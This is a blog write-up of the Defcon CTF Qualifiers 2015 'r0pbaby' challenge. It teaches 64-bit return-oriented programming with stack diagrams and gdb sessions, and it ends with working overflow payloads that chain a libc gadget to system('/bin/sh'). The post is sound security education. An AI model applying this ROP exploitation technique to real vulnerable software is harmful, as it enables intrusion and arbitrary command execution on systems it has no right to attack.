---
id: 2003
title: 'Defcon Quals: r0pbaby (simple 64-bit ROP)'
date: '2015-05-20T11:34:06-05:00'
author: ron
layout: post
guid: https://blog.skullsecurity.org/?p=2003
permalink: "/2015/defcon-quals-r0pbaby-simple-64-bit-rop"
categories:
- defcon-quals-2015
comments_id: '109638370803109728'

---

This past weekend I competed in the <a href='https://2015.legitbs.net/'>Defcon CTF Qualifiers</a> from the <a href='https://legitbs.net/'>Legit Business Syndicate</a>. In the past it's been one of my favourite competitions, and this year was no exception!

Unfortunately, I got stuck for quite a long time on a 2-point problem ("wwtw") and spent most of my weekend on it. But I did do a few others - r0pbaby included - and am excited to write about them, as well!

<a href='/blogdata/r0pbaby'>r0pbaby</a> is neat, because it's an absolute bare-bones ROP (return-oriented programming) level. Quite honestly, when it makes sense, I actually prefer using a ROP chain to using shellcode. Much of the time, it's actually easier! You can see the binary, my solution, and other stuff I used on <a href='https://github.com/iagox86/defcon-quals-2015/tree/master/r0pbaby'>this github repo</a>.

It might make sense to read <a href='/2013/ropasaurusrex-a-primer-on-return-oriented-programming'>a post I made in 2013</a> about a level in PlaidCTF called ropasaurusrex. But it's not really necessary - I'm going to explain the same stuff again with two years more experience!
<!--more-->
<h2>What is ROP?</h2>

Most modern systems have DEP - <a href='http://en.wikipedia.org/wiki/Data_Execution_Prevention'>data execution prevention</a> - enabled. That means that when trying to run arbitrary code, the code has be in memory that's executable. Typically, when a process is running, all memory segments are either writable (+w) or executable (+x) - not both. That's sometimes called "<a href='http://en.wikipedia.org/wiki/W%5EX'>W^X</a>", but it seems more appropriate to just call it common sense.

ROP - <a href='http://en.wikipedia.org/wiki/Return-oriented_programming'>return-oriented programming</a> - is an exploitation technique that bypasses DEP. It does that by chaining together legitimate code that's already in executable memory. This requires the attacker to either a) have complete control of the stack, or b) have control of rip/eip (the instruction pointer register) and the ability to change esp/rsp (the stack pointer) to point to another buffer.

As a quick example, let's say you overwrite the return address of a vulnerable function with the address of libc's sleep() function. When the vulnerable function attempts to return, instead of returning to where it's supposed to (or returning to shellcode), it'll return to the first line of sleep().

On a 32-bit system, sleep() will look at the next-to-next value on the stack to find out how long to sleep(). On a 64-bit system, it'll look at the value of the rdi register for its argument, which is a little more elaborate to set up. When it's done, it'll return to the next value on the stack on both architectures, which could very well be another function.

So basically, sleep() expects its stack to look like on 32-bit:

<pre>
+----------------------+
|...higher addresses...|
+----------------------+
|         1000         | &lt;-- sleep() looks here for its param (on 32-bit)
+----------------------+
|     [return addr]    | &lt;-- where esp will be when sleep() is entered
+----------------------+
|    [sleep's  addr]   | &lt;-- return addr of previous function
+----------------------+
|...lower addresses....| &lt;-- other data from previous function
+----------------------+
</pre>

And on 64-bit:

<pre>
+----------------------+
|...higher addresses...|
+----------------------+ &lt;-- sleep()'s param is in rdi, so it's not needed here
|     [return addr]    | &lt;-- where rsp will be when sleep() is entered
+----------------------+
|    [sleep's  addr]   | &lt;-- return addr of previous function
+----------------------+
|...lower addresses....| &lt;-- other data from previous function
+----------------------+
</pre>

We'll dive into deeper detail of how to set this up and see way more stack diagrams shortly. But let's start from the beginning!

<h2>Taking a first look</h2>

When you run r0pbaby, or connect to their service, you will see a prompt (the program uses stdin/stdout for i/o):

<pre>
$ ./r0pbaby

Welcome to an easy Return Oriented Programming challenge...
Menu:
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
:
</pre>

It's worthwhile messing with the options a bit to get a feel for it:

<pre>
$ ./r0pbaby

Welcome to an easy Return Oriented Programming challenge...
Menu:
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: <strong>1</strong>
libc.so.6: 0x00007FFFF7FF8B28
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: <strong>2</strong>
Enter symbol: system
Symbol system: 0x00007FFFF7883960
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: <strong>2</strong>
Enter symbol: printf
Symbol printf: 0x00007FFFF7892F10
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: <strong>3</strong>
Enter bytes to send (max 1024): hello???
Invalid amount.
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
:
</pre>

We'll look at option 3 more in a little while, but for now let's take a quick look at options 1 and 2. The rest of this section isn't directly applicable to the exploitation stuff, so you're free to skip it if you want. :)

If you look at the results from option 1 and option 2, you'll see one strange thing: the return from "Get libc address" is higher than the addresses of printf() and system(). It also isn't page aligned (a multiple of 0x1000 (4096), usually), so it almost certainly isn't actually the base address (which, in fairness, the level doesn't explicitly <em>say</em> it is).

I messed around a bit out of curiosity. Here's what I discovered...

First, run the program in gdb and get the address that they claim is libc:

<pre>
$ gdb -q ./r0pbaby
Reading symbols from ./r0pbaby...(no debugging symbols found)...done.
(gdb) run
Starting program: /home/ron/defcon-quals/r0pbaby/r0pbaby

Welcome to an easy Return Oriented Programming challenge...
Menu:
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: <strong>1</strong>
libc.so.6: 0x00007FFFF7FF8B28
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
</pre>

So that's what it returns: 0x00007FFFF7FF8B28. Now we use ctrl-c to break into the debugger and figure out the real base address:

<pre>
: <strong>^C</strong>
Program received signal SIGINT, Interrupt.
0x00007ffff791e5e0 in __read_nocancel () from /lib64/libc.so.6
(gdb) <strong>info proc map</strong>
process 5475
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
      0x555555554000     0x555555556000     0x2000        0x0 /home/ron/defcon-quals/r0pbaby/r0pbaby
      0x555555755000     0x555555757000     0x2000     0x1000 /home/ron/defcon-quals/r0pbaby/r0pbaby
      0x555555757000     0x555555778000    0x21000        0x0 [heap]
      0x7ffff7842000     0x7ffff79cf000   0x18d000        0x0 /lib64/libc-2.20.so
      0x7ffff79cf000     0x7ffff7bce000   0x1ff000   0x18d000 /lib64/libc-2.20.so
      0x7ffff7bce000     0x7ffff7bd2000     0x4000   0x18c000 /lib64/libc-2.20.so
      0x7ffff7bd2000     0x7ffff7bd4000     0x2000   0x190000 /lib64/libc-2.20.so
[...]
</pre>

This tells us that the actual address where libc is loaded is 0x7ffff7842000. Theirs was definitely wrong!

On a Linux system, the first 4 bytes at the base address will usually be "\x7fELF" or "\x7f\x45\x4c\x46". We can check the first four bytes at the actual base address to verify:

<pre>
(gdb) <strong>x/8xb 0x7ffff7842000</strong>
0x7ffff7842000: 0x7f    0x45    0x4c    0x46    0x02    0x01    0x01    0x00
(gdb) <strong>x/8xc 0x7ffff7842000</strong>
0x7ffff7842000: 127 '\177'      69 'E'  76 'L'  70 'F'  2 '\002'        1 '\001'        1 '\001'        0 '\000'
</pre>

And we can check the base address that the program tells us:

<pre>
(gdb) <strong>x/8xb 0x00007FFFF7FF8B28</strong>
0x7ffff7ff8b28: 0x00    0x20    0x84    0xf7    0xff    0x7f    0x00    0x00
</pre>

From experience, that looks like a 64-bit address to me (6 bytes long, starts with 0x7f if you read it in little endian), so I tried print it as a 64-bit value:

<pre>
(gdb) <strong>x/xg 0x00007FFFF7FF8B28</strong>
0x7ffff7ff8b28: 0x00007ffff7842000
</pre>

Aha! It's a pointer to the <em>actual</em> base address! It seems a little odd to send that to the user, it does them basically no good, so I'll assume that it's a bug. :)

<h2>Stealing libc</h2>

If there's one thing I hate, it's attacking a level blind. Based on the output so far, it's pretty clear that they're going to want us to call a libc function, but they don't actually give us a copy of libc.so! While it's not strictly necessary, having a copy of libc.so makes this far easier.

I'll post more details about how and why to steal libc in a future post, but for now, suffice to stay: if you can, beat the easiest 64-bit level first (like babycmd) and liberate a copy of libc.so. Also snag a 32-bit version of libc if you can find one. Believe me, you'll be thankful for it later! To make it possible to follow the rest of this post, <a href='/blogdata/libc-babycmd-x64.so'>here's libc-2.19.so from babycmd</a> and <a href='/blogdata/libc-ron-x64.so'>here's libc-2.20.so from my box</a>, which is the one I'll use for this writeup.

You might be wondering how to verify whether or not that actually IS the right library. For now, let's consider that to be homework. I'll be writing more about that in the future, I promise!

<h2>Find a crash</h2>

I played around with option 3 for awhile, but it kept giving me a length error. So I used the best approach for annoying CTF problems: I asked <a href="https://twitter.com/alexwebr">a teammate</a> who'd already solved that problem. He'd reverse engineered the function already, saving me the trouble. :)

It turns out that the correct way to format things is by sending a length, then a newline, then the payload:

<pre>
$ ./r0pbaby

Welcome to an easy Return Oriented Programming challenge...
Menu:
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: <strong>3</strong>
Enter bytes to send (max 1024): 20
<strong>AAAAAAAAAAAAAAAAAAAA</strong>
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: Bad choice.
Segmentation fault
</pre>

Well, that may be one of the easiest ways I've gotten a segfault! But the work isn't quite done. :)

<h2>rip control</h2>

Our first goal is going to be to get control of rip (that's like eip, the instruction pointer, but on a 64-bit system). As you probably know by now, rip is the register that points to the current instruction being executed. If we move it, different code runs. The classic attack is to move eip to point at shellcode, but ROP is different. We want to carefully control rip to make sure it winds up in all the right places.

But first, let's non-carefully control it!

The program indicates that it's writing the r0p buffer to the stack, so the easiest thing to do is probably to start throwing stuff into the buffer to see what happens. I like to send a string with a series of values I'll recognize in a debugger. Since it's a 64-bit app, I send 8 "A"s, 8 "B"s, and so on. If it doesn't crash. I send more.

<pre>
$ <strong>gdb -q ./r0pbaby</strong>
(gdb) run

[...]

: <strong>3</strong>
Enter bytes to send (max 1024): 32
<strong>AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD</strong>
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: Bad choice.

Program received signal SIGSEGV, Segmentation fault.
0x0000555555554eb3 in ?? ()
</pre>

All right, it crashes at 0x0000555555554eb3. Let's take a look at what lives at the current instruction (pro-tip: "x/i $rip" or equivalent is basically always the first thing I run on any crash I'm investigating):

<pre>
(gdb) <strong>x/i $rip</strong>
=&gt; 0x555555554eb3:      ret
</pre>

It's crashing while attempting to return! That generally only happens when either the stack pointer is messed up...

<pre>
(gdb) <strong>print/x $rsp</strong>
$1 = 0x7fffffffd918
</pre>

...which it doesn't appear to be, or when it's trying to return to a bad address...

<pre>
(gdb) <strong>x/xg $rsp</strong>
0x7fffffffd918: 0x4242424242424242
</pre>

...which it is! It's trying to return to 0x4242424242424242 ("BBBBBBBB"), which is an illegal address (<a href='http://stackoverflow.com/questions/6716946/why-do-64-bit-systems-have-only-a-48-bit-address-space'>the first two bytes have to be zero on a 64-bit system</a>).

We can confirm this, and also prove to ourselves that NUL bytes are allowed in the input, by sending a couple of NUL bytes. I'm switching to using 'echo' on the commandline now, so I can easily add NUL bytes (keep in mind that because of little endian, the NUL bytes have to go after the "B"s, not before):

<pre>
$ <strong>ulimit -c unlimited</strong>
$ <strong>echo -ne '3\n32\nAAAAAAAABBBBBB\0\0CCCCCCCCDDDDDDDD\n' | ./r0pbaby</strong>
[...]
Segmentation fault (core dumped)
$ <strong>gdb ./r0pbaby ./core</strong>
[...]
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x0000424242424242 in ?? ()
</pre>

Now we can see that rip was successfully set to 0x0000424242424242 ("BBBBBB\0\0" because of little endian)!

<h2>How's the stack work again?</h2>

As I said at the start, reading <a href='/2013/ropasaurusrex-a-primer-on-return-oriented-programming'>my post about ropasaurusrex</a> would be a good way to get acquainted with ROP exploits. If you're pretty comfortable with stacks or you've recently read/understood that post, feel free to skip this section!

Let's start by talking about <strong>32-bit systems</strong> - where parameters are passed on the stack instead of in registers. I'll explain how to deal with register parameters in 64-bit below.

Okay, so: a program's stack is a run-time structure that holds temporary values that functions need. Things like the parameters, the local variables, the return address, and other stuff. When a function is called, it allocates itself some space on the stack by growing downward (towards lower memory addresses) When the function returns, the data's all removed from the stack (it's not actually wiped from memory, it just becomes free to get overwritten). The register rsp always points to the most recent thing pushed to the stack and the next thing that would be popped off the stack.

Let's use sleep() as an example again. You call sleep() like this:

<pre>
1: push 1000
2: call sleep
</pre>

or like this:

<pre>
1. mov [esp], 1000
2: call sleep
</pre>

They're identical, as far as sleep() is concerned. The first is a tiny bit more memory efficient and the second is a tiny bit faster, but that's about it.

Before line 1, we don't know or care what's on the stack. We can look at it like this (I'm choosing completely arbitrary addresses so you can match up diagrams with each other):

<pre>
       +----------------------+
       |...higher addresses...|
       +----------------------+
0x1040 |     (irrelevant)     |
       +----------------------+
0x103c |     (irrelevant)     |
       +----------------------+
0x1038 |     (irrelevant)     | &lt;-- rsp
       +----------------------+
0x1034 |       (unused)       |
       +----------------------+
0x1030 |       (unused)       |
       +----------------------+
       |...lower addresses....|
       +----------------------+
</pre>

Values lower than rsp are unused. That means that as far as the stack's concerned, they're unallocated. They might be zero, or they might contain values from previous function calls. In a properly working system, they're never read. If they're accidentally used (like if somebody declares a variable but forgets to initialize it), you could wind up with a use-after-free vulnerability or similar.

The value that rsp is pointing to and the values above it (at higher addresses) also don't really matter. They're part of the stack frame for the function that's calling sleep(), and sleep() doesn't care about those. It only cares about its own stack frame (a stack frame, as we'll see, is the parameters, return address, saved registers, and local variables of a function - basically, everything the function stores on the stack and everything it cares about on the stack).

Line 1 pushes 1000 onto the stack. The frame will then look like this:

<pre>
       +----------------------+
       |...higher addresses...|
       +----------------------+
0x103c |     (irrelevant)     |
       +----------------------+
0x1038 |     (irrelevant)     | &lt;-- stuff from the previous function
       +----------------------+
       +----------------------+ &lt;-- start of sleep()'s stack frame
0x1034 |         1000         | &lt;-- rsp
       +----------------------+
0x1030 |       (unused)       |
       +----------------------+
       |...lower addresses....|
       +----------------------+
</pre>

When you call the function at line 2, it pushes the return address onto the stack, like this:

<pre>
       +----------------------+
       |...higher addresses...|
       +----------------------+
0x1038 |     (irrelevant)     |
       +----------------------+
       +----------------------+ &lt;-- start of sleep()'s stack frame
0x1034 |         1000         |
       +----------------------+
0x1030 |     [return addr]    | &lt;-- rsp
       +----------------------+
0x102c |       (unused)       |
       +----------------------+
0x1028 |       (unused)       |
       +----------------------+
0x1024 |       (unused)       |
       +----------------------+
       |...lower addresses....|
       +----------------------+
</pre>

Note how rsp has moved from 0x1038 to 0x1034 to 0x1030 as stuff is added to the stack. But it always points to the last thing added!

Let's look at how sleep() might be implemented. This is a very common function prelude:

100; sleep():
101: push rbp
102: mov rbp, rsp
103: sub rsp, 0x20
104: ...everything else...

(Note that those are line numbers for reference, not actual addresses, so please don't get upset that the values don't increment enough :) )

At line 100, the old frame pointer is saved to the stack:

<pre>
       +----------------------+
       |...higher addresses...|
       +----------------------+
0x1038 |     (irrelevant)     |
       +----------------------+
       +----------------------+ &lt;-- start of sleep()'s stack frame
0x1034 |         1000         |
       +----------------------+
0x1030 |     [return addr]    |
       +----------------------+
0x102c |     [saved frame]    | &lt;-- rsp
       +----------------------+
0x1028 |       (unused)       |
       +----------------------+
0x1024 |       (unused)       |
       +----------------------+
0x1020 |       (unused)       |
       +----------------------+
       |...lower addresses....|
       +----------------------+
</pre>

Then at line 102, nothing on the stack changes. On line 103, 0x20 is subtracted from esp, which effectively reserves 0x20 (32) bytes for local variables:

<pre>
       +----------------------+
       |...higher addresses...|
       +----------------------+
0x1038 |     (irrelevant)     |
       +----------------------+
       +----------------------+ &lt;-- start of sleep()'s stack frame
0x1034 |         1000         |
       +----------------------+
0x1030 |     [return addr]    |
       +----------------------+
0x102c |     [saved frame]    |
       +----------------------+
       |                      |
0x1028 |                      |
   -   |     [local vars]     | &lt;-- rsp
0x1008 |                      |
       |                      |
       +----------------------+ &lt;-- end of sleep()'s stack frame
       +----------------------+
0x1004 |       (unused)       |
       +----------------------+
0x1000 |       (unused)       |
       +----------------------+
       |...lower addresses....|
       +----------------------+
</pre>

And that's the entire stack frame for the sleep(0 function call! It's possible that there are other registers preserved on the stack, in addition to rbp, but that doesn't really change anything. We only care about the parameters and the return address.

If sleep() calls a function, the same process will happen:

<pre>
       +----------------------+
       |...higher addresses...|
       +----------------------+
0x1038 |     (irrelevant)     |
       +----------------------+
       +----------------------+ &lt;-- start of sleep()'s stack frame
0x1034 |         1000         |
       +----------------------+
0x1030 |     [return addr]    |
       +----------------------+
0x102c |     [saved frame]    |
       +----------------------+
       |                      |
0x1028 |                      |
   -   |     [local vars]     |
0x1008 |                      |
       |                      |
       +----------------------+ &lt;-- end of sleep()'s stack frame
       +----------------------+ &lt;-- start of next function's stack frame
0x1004 |       [params]       |
       +----------------------+
0x1000 |     [return addr]    |
       +----------------------+
0x0ffc |     [saved frame]    |
       +----------------------+
       |                      |
0x0ffc |                      |
   -   |     [local vars]     |
0x0fb4 |                      |
       |                      |
       +----------------------+ &lt;-- end of next function's stack frame
       +----------------------+
0x0fb0 |       (unused)       |
       +----------------------+
0x0fac |       (unused)       |
       +----------------------+
       |...lower addresses....|
       +----------------------+
</pre>

And so on, with the stack constantly growing towards lower addresses. When the function returns, the same thing happens in reverse order (the local vars are removed from the stack by adding to rsp (or replacing it with rbp), rbp is popped off the stack, and the return address is popped and returned to).

The parameters are cleared off the stack by either the caller or callee, depending on the compiler, but that won't come into play for this writeup. However, when ROP is used to call multiple functions, unless the function clean up their own parameters off the stack, the exploit developer has to do it themselves. Typically, on Windows functions clean up after themselves but on other OSes they don't (but you can't rely on that). This is done by using a "pop ret", "pop pop ret", etc., after each function call. See my ropasaurusrex writeup for more details.

<h3>Enter: 64-bit</h3>

The fact that this level is 64-bit complicates things in important ways (and ways that I always seem to forget about till things don't work).

Specifically, in 64-bit, the first handful of parameters to a function are passed in registers, not on the stack. I don't have the order of registers memorized - I forget it after every CTF, along with whether ja/jb or jl/jg are the unsigned ones - but the first two are rdi and rsi. That means that to call the same sleep() function on 64-bit, we'd have this code instead:

<pre>
1: mov rdi, 1000
2: call sleep
</pre>

And its stack frame would look like this:

<pre>
       +----------------------+
       |...higher addresses...|
       +----------------------+ &lt;-- start of previous function's stack frame
       +----------------------+ &lt;-- start of sleep()'s stack frame
0x1030 |     [return addr]    |
       +----------------------+
0x102c |     [saved frame]    |
       +----------------------+
       |                      |
0x1028 |                      |
   -   |     [local vars]     |
0x1008 |                      |
       |                      |
       +----------------------+ &lt;-- end of sleep()'s stack frame
       +----------------------+
       |...lower addresses....|
       +----------------------+
</pre>

No parameters, just the return address, saved frame pointer, and local variables. It's exceedingly rare for the stack to be used for parameters on 64-bit.

<h2>Stacks: the important bit</h2>

Okay, so that's a stack frame. A stack frame contains parameters, return address, saved registers, and local variables. On 64-bit, it usually contains the return address, saved registers, and local variables (no parameters).

But here's the thing: when you enter a function - that is to say, when you start running the first line of the function - the <em>function doesn't really know where you came from</em>. I mean, not <em>really</em>. It knows the return address that's on the stack, but doesn't really have a way to validate that it's real (except with advanced exploitation mitigations). It also knows that there are some parameters right before (at higher addresses than) the return address, if it's 32-bit. Or that rdi/rsi/etc. contain parameters if it's 64-bit.

So let's say you overwrote the return address on the stack and returned to the first line of sleep(). What's it going to do?

As we saw, on 64-bit, sleep() expects its stack frame to contain a return address:

<pre>
+----------------------+
|...higher addresses...|
+----------------------+
+----------------------+ &lt;-- start of sleep()'s stack frame
|     [return addr]    | &lt;-- rsp
+----------------------+
|     (unallocated)    |
+----------------------+
|...lower addressess...|
+----------------------+
</pre>

sleep() will push some registers, make room for local variables, and really just do its own thing. When it's all done, it'll grab the return address from the stack, return to it, and somebody will move rsp back to the calling function's stack frame (it, getting rid of the parameters from the stack).

<h2>Using system()</h2>

Because this level uses stdout and stdin for i/o, all we really have to do is make this call:

<pre>
system("/bin/sh")
</pre>

Then we can run arbitrary commands. Seems pretty simple, eh? We don't even care where system() returns to, once it's done the program can just crash!

You just have to do two things:

<ol>
  <li>set rip to the address of system()</li>
  <li>set rdi to a pointer to the string "/bin/sh" (or just "sh" if you prefer)</li>
</ol>

Setting rip to the address of system() is easy. We have the address of system() and we have rip control, as we discovered. It's just a matter of grabbing the address of system() and using that in the overflow.

Setting rdi to the pointer to "/bin/sh" is a little more problematic, though. First, we need to find the address of "/bin/sh" somehow. Then we need a "gadget" to put it in rdi. A "gadget", in ROP, refers to a small piece of code that performs an operation then returns.

It turns out, all of the above can be easily done by using a copy of libc.so. Remember how I told you it'd come in handy?

<h2>Finding "/bin/sh"</h2>

So, this is actually pretty easy. We need to find "/bin/sh" given a) the ability to leak an address in libc.so (which this program does by design), and b) a copy of libc.so. Even with <a href='https://en.wikipedia.org/wiki/Address_space_layout_randomization'>ASLR</a> turned on, any two addresses within the same binary (like within libc.so or within the binary itself) won't change their relative positions to each other. Addresses in two different binaries will likely be different, though.

If you fire up IDA, and go to the "strings" tab (shift-F12), you can search for "/bin/sh". You'll see that "/bin/sh" will have an address something like 0x7ffff6aa307c.

Alternatively, you can use this gdb command (helpfully supplied by bla from <a href='http://io.smashthestack.org/'>io.sts</a>):

<pre>
(gdb) find /b 0x7ffff7842000,0x7ffff7bd4000, '/','b','i','n','/','s','h'
0x7ffff79a307c
warning: Unable to access 16000 bytes of target memory at 0x7ffff79d5d03, halting search.
1 pattern found.
(gdb) x/s 0x7ffff79a307c
0x7ffff79a307c: "/bin/sh"
</pre>

Once you've obtained the address of "/bin/sh", find the address of any libc function - we'll use system(), since system() will come in handy later. The address will be something like 0x00007ffff6983960. If you subtract the two addresses, you'll discover that the address of "/bin/sh" is 0x11f71c bytes after the address of system(). As I said earlier, that won't change, so we can reliably use that in our exploit.

Now when you run the program:

<pre>
$ <strong>./r0pbaby</strong>

Welcome to an easy Return Oriented Programming challenge...
Menu:
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: <strong>2</strong>
Enter symbol: system
Symbol system: 0x00007FFFF7883960
</pre>

You can easily calculate that the address of the string "/bin/sh" will be at 0x00007ffff7883960 + 0x11f71c = 0x7ffff79a307c.

<h2>Getting "/bin/sh" into rdi</h2>

The next thing you'll want to do is put "/bin/sh" into rdi. We can do that in two steps (recall that we have control of the stack - it's the point of the level):

<ol>
  <li>Put it on the stack</li>
  <li>Find a "pop rdi" gadget</li>
</ol>

To do this, I literally searched for "pop     rdi" in IDA. With the spaces and everything! :)

I found this in both my own copy of libc and the one I stole from babycmd:

<pre>
<span class="Statement">.text</span>:<span class="Constant">00007FFFF80E1DF1</span>                 <span class="Identifier">pop</span>     <span class="Identifier">rax</span>
<span class="Statement">.text</span>:<span class="Constant">00007FFFF80E1DF2</span>                 <span class="Identifier">pop</span>     <span class="Identifier">rdi</span>
<span class="Statement">.text</span>:<span class="Constant">00007FFFF80E1DF3</span>                 <span class="Identifier">call</span>    <span class="Identifier">rax</span>
</pre>

What a beautiful sequence! It pops the next value of the stack into rax, pops the next value into rdi, and calls rax. So it calls an address from the stack with a parameter read from the stack. It's such a lovely gadget! I was surprised and excited to find it, though I'm sure every other CTF team already knew about it. :)

The absolute address that IDA gives us is 0x00007ffff80e1df1, but just like the "/bin/sh" string, the address relative to the rest of the binary never changes. If you subtract the address of system() from that address, you'll get 0xa7969 (on my copy of libc).

Let's look at an example of what's actually going on when we call that gadget. You're at the end of main() and getting ready to return. rsp is pointing to what it thinks is the return address, but is really "BBBBBBBB"-now-gadget_addr:

<pre>
+----------------------+
|...higher addresses...|
+----------------------+
|       DDDDDDDD       |
+----------------------+
|       CCCCCCCC       |
+----------------------+
|  0x00007ffff80e1df1  | &lt;-- rsp
+----------------------+
|       AAAAAAAA       |
+----------------------+
|...lower addresses....|
+----------------------+
</pre>

When the return happens, it looks like this:

<pre>
+----------------------+
|...higher addresses...|
+----------------------+
|       DDDDDDDD       |
+----------------------+
|       CCCCCCCC       | &lt;-- rsp
+----------------------+
|  0x00007FFFF80E1DF1  |
+----------------------+
|       AAAAAAAA       |
+----------------------+
|...lower addresses....|
+----------------------+
</pre>

The first instruction - pop rax - runs. rax is now 0x4343434343434343 ("CCCCCCCC").

The second instruction - pop rdi - runs. rdi is now 0x4444444444444444 ("DDDDDDDD").

Then the final instruction - call rax - is called. It'll attempt to call 0x4343434343434343, with 0x4444444444444444 as its parameter, and crash. Controlling both the called address and the parameter is a huge win!

<h2>Putting it all together</h2>

I realize this is a lot to take in if you can't read stacks backwards and forwards (trust me, I frequently read stacks backwards - in fact, I wrote this entire blog post with upside-down stacks before I noticed and had to go back and fix it! :) ).

Here's what we have:

<ul>
  <li>The ability to write up to 1024 bytes onto the stack</li>
  <li>The ability to get the address of system()</li>
  <li>The ability to get the address of "/bin/sh", based on the address of system()</li>
  <li>The ability to get the address of a sexy gadget, also based on system(), that'll call something from the stack with a parameter from the stack</li>
</ul>

We're overflowing a local variable in main(). Immediately before our overflow, this is what main()'s stack frame probably looks like:

<pre>
+----------------------+
|...higher addresses...|
+----------------------+ &lt;-- start of main()'s stack frame
|         argv         |
+----------------------+
|         argc         |
+----------------------+
|     [return addr]    | &lt;-- return address of main()
+----------------------+
|     [saved frame]    | &lt;-- overflowable variable must start here
+----------------------+
|                      |
|                      |
|     [local vars]     | &lt;-- rsp
|                      |
|                      |
+----------------------+ &lt;-- end of main()'s stack frame
|...lower addresses....|
+----------------------+
</pre>

Because you only get 8 bytes before you hit the return address, the first 8 bytes are probably overwriting the saved frame pointer (or whatever, it doesn't really matter, but you can prove it's the frame pointer by using a debugger and verifying that rbp is 0x4141414141414141 after it returns (it is)).

The main thing is, as we saw earlier, if you send the string "AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD", the "BBBBBBBB" winds up as main()'s return address. That means the stack winds up looking like this before main() starts cleaning up its stack frame:

<pre>
+----------------------+
|...higher addresses...|
+----------------------+ &lt;-- WAS the start of main()'s stack frame
|       DDDDDDDD       |
+----------------------+
|       CCCCCCCC       |
+----------------------+
|       BBBBBBBB       | &lt;-- return address of main()
+----------------------+
|       AAAAAAAA       | &lt;-- overflowable variable must start here
+----------------------+
|                      |
|                      |
|     [local vars]     |
|                      |
|                      | &lt;-- rsp
+----------------------+ &lt;-- end of main()'s stack frame
|...lower addresses....|
+----------------------+
</pre>

When main attempts to return, it tries to return to 0x4242424242424242 as we saw earlier, and it crashes.

Now, one thing we can do is return directly to system(). But your guess is as good as mine as to what's in rdi, but you can bet it's not going to be "/bin/sh". So instead, we return to our gadget:

<pre>
+----------------------+
|...higher addresses...|
+----------------------+ &lt;-- start of main()'s stack frame
|       DDDDDDDD       |
+----------------------+
|       CCCCCCCC       |
+----------------------+
|     gadget_addr      | &lt;-- return address of main()
+----------------------+
|       AAAAAAAA       | &lt;-- overflowable variable must start here
+----------------------+
|                      |
|                      |
|     [local vars]     |
|                      |
|                      | &lt;-- rsp
+----------------------+ &lt;-- end of main()'s stack frame
|...lower addresses....|
+----------------------+
</pre>

Since I have <a href='https://stackoverflow.com/questions/5194666/disable-randomization-of-memory-addresses'>ASLR off on my computer</a> (if you do turn it off, please make sure you turn it back on!), I can pre-compute the addresses I need.

Symbol system: 0x00007FFFF7883960 (from the program)

sh_addr = system_addr + 0x11f71c
sh_addr = 0x00007ffff7883960 + 0x11f71c
sh_addr = 0x7ffff79a307c

gadget_addr = system_addr + 0xa7969
gadget_addr = 0x00007ffff7883960 + 0xa7969
gadget_addr = 0x7ffff792b2c9

So now, let's change the exploit we used to crash it a long time ago (we replace the "B"s with the address of our gadget, in <a href='https://en.wikipedia.org/wiki/Endianness'>little endian</a> format:

<pre>
$ <strong>echo -ne '3\n32\nAAAAAAAA\xc9\xb2\x92\xf7\xff\x7f\x00\x00CCCCCCCCDDDDDDDD\n' | ./r0pbaby</strong>
Welcome to an easy Return Oriented Programming challenge...
[...]
Menu:
Segmentation fault (core dumped)
</pre>

Great! It crashed as expected! Let's take a look at HOW it crashed:

<pre>
$ <strong>gdb -q ./r0pbaby ./core</strong>
Core was generated by `./r0pbaby'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x00007ffff792b2cb in clone () from /lib64/libc.so.6
(gdb) x/i $rip
=&gt; 0x7ffff792b2cb <clone+107>:  call   rax
</pre>

It crashed on the call at the end of the gadget, which makes sense! Let's check out what it's trying to call and what it's using as a parameter:

<pre>
(gdb) <strong>print/x $rax</strong>
$1 = 0x4343434343434343
(gdb) <strong>print/x $rdi</strong>
$2 = 0x4444444444444444
</pre>

It's trying to call "CCCCCCCC" with the parameter "DDDDDDDD". Awesome! Let's try it again, but this time we'll plug in our sh_address in place of "DDDDDDDD" to make sure that's working (I strongly believe in incremental testing :) ):

<pre>
$ <strong>echo -ne '3\n32\nAAAAAAAA\xc9\xb2\x92\xf7\xff\x7f\x00\x00CCCCCCCC\x7c\x30\x9a\xf7\xff\x7f\x00\x00\n' | ./r0pbaby</strong>
[...]
Segmentation fault (core dumped)
$ <strong>gdb -q ./r0pbaby ./core</strong>
[...]
(gdb) x/i $rip
=> 0x7ffff792b2cb <clone+107>:  call   rax
</pre>

It's still crashing in the same place! We don't have to check rax, we know it'll be 0x4343434343434343 ("CCCCCCCC") again. But let's check out if rdi is right:

<pre>
(gdb) <strong>print/x $rdi</strong>
$2 = 0x7ffff79a307c
(gdb) <strong>x/s $rdi</strong>
0x7ffff79a307c: "/bin/sh"
</pre>

All right, the parameter is set properly!

One last step: Replace the return address ("CCCCCCCC") with the address of system 0x00007ffff7883960:

<pre>
$<strong> echo -ne '3\n32\nAAAAAAAA\xc9\xb2\x92\xf7\xff\x7f\x00\x00\x60\x39\x88\xf7\xff\x7f\x00\x00\x7c\x30\x9a\xf7\xff\x7f\x00\x00\n' | ./r0pbaby</strong>
</pre>

<a name='update2'></a>Unfortunately, you can't return into system(). I couldn't figure out why, but on Twitter <a href='https://www.twitter.com/jkadijk'>Jan Kadijk</a> said that it's likely because system() ends when it sees the end of file (EOF) marker, which makes perfect sense.

